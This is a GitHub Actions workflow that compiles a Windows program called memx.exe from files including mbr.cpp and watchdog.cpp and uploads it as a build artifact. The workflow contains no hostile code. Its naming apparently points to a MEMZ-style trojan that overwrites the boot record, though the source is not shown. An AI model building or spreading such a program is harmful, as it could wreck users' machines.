name: Build MEMX

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
    
    - name: Build EXE
      shell: cmd
      run: |
        cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib /SUBSYSTEM:WINDOWS /OUT:memx.exe
    
    - name: Upload EXE
      uses: actions/upload-artifact@v4
      with:
        name: memx-exe
        path: memx.exe